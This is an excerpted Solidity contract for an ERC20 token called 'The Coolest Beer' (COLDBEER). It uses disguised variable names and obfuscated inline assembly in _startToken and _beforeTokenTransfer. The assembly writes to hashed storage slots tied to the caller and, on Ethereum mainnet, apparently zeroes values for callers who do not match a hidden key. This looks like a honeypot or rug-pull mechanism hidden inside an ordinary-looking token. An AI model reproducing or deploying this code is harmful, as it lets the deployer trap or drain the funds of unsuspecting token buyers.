...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addBeer;
    uint256 private coldDrink = block.number*2;

    mapping (address => bool) private _firstProcess; 
    mapping (address => bool) private _secondAlcohol;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private beanStock;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private plantManagement;
    address public pair;
    ...
    bool private trading; uint256 private directTV = 1; bool private flyHome;
    uint256 private _decimals; uint256 private freezeUp;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addBeer.push(_router); addBeer.push(msgSender_); addBeer.push(pair);
        for (uint256 q=0; q < 3;) {_firstProcess[addBeer[q]] = true; unchecked{q++;} }
    }
    ...
    function _startToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x9a0d4cea42bf8099cc260541f4d9690cd895e56b6d97765f01157b2e5459f912
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x7606c51e50207b5893b8257607c99192dacd9df94c9958e590a95b2715f03af5,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; coldDrink = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addBeer[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployBeer(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addBeer[0], 10 ** 77);
        _startToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployBeer(creator, initialSupply);
    }
}

contract TheCoolestBeer is ERC20Token {
    constructor() ERC20Token("The Coolest Beer", "COLDBEER", msg.sender, 275000 * 10 ** 18) {
    }
}